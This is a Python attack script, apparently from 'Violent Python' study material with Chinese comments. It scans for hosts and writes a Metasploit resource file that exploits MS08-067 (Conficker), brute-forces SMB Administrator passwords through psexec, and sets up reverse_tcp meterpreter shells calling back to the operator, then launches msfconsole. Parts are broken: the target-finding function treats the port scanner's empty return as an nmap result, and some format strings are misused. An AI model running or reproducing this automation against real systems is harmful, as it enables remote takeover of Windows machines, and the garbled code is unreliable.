#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import optparse
import sys
from socket import *
from threading import *

screenLock = Semaphore(value=1)

def connScan(tgtHost, tgtPort):
    global connSkt
    try:
        connSkt = socket(AF_INET, SOCK_STREAM)#IPv4协议，TCP链接（面向链接的可靠字节流），创建一个链接对象
        connSkt.connect((tgtHost, tgtPort))#链接到主机，连接到tgtHost的远程套接字
        connSkt.send('ViolentPython\r\n')#将数据发送到套接字
        results = connSkt.recv(100)#接受套接字的数据，数据以字符串的形式返回，100位最大的数据量
        screenLock.acquire()

        print('[+] %d/tcp open'%tgtPort)
        print ('[+] ' + str(results))
    except:
        screenLock.acquire()
        print ('[-] %d/tcp closed'%tgtPort)
    finally:
        screenLock.release()
        connSkt.close()



def portScan(tgtHost, tgtPorts):
    try:
        tgtIP = gethostbyname(tgtHost)#获取主机的名称
    except:
        print("[-] Cannot resolve '%s': Unknown host".format(tgtHost))
        return

    try:
        tgtName = gethostbyaddr(tgtIP)
        print ('\n[+] Scan Results for:%d,%d,%d '.format(tgtName[0],tgtName[1],tgtName[2]))
    except:
        print ('\n[+] Scan Results for: ' + tgtIP)

    setdefaulttimeout(1)

    for tgtPort in tgtPorts:
        t = Thread(target=connScan,args=(tgtHost,int(tgtPort)))
        t.start()


def findTgts(subNet):
    nmScan = portScan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print('[+] Found Target Host: ' + host)
                tgtHosts.append(host)
    return tgtHosts


def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload '+'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile,tgtHost,lhost,lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload '+'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')


def smbBrute(configFile,tgtHost,passwdFile,lhost,lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set payload '+'windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')


def main():
    configFile = open('meta.rc', 'w')

    parser = optparse.OptionParser('[-] Usage %prog '+'-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    parser.add_option('-H', dest='tgtHost', type='string',help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string',help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string',help='specify the listen address')
    parser.add_option('-F', dest='passwdFile', type='string',help='password file for SMB brute force attempt')

    (options, args) = parser.parse_args()

    if (options.tgtHost == None) | (options.lhost == None):
        print(parser.usage)
        exit(0)

    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '1337'
    passwdFile = options.passwdFile
    tgtHosts = findTgts(options.tgtHost)

    setupHandler(configFile, lhost, lport)

    for tgtHost in tgtHosts:
        confickerExploit(configFile, tgtHost, lhost, lport)
        if passwdFile != None:
            smbBrute(configFile,tgtHost,passwdFile,lhost,lport)

    configFile.close()
    os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()
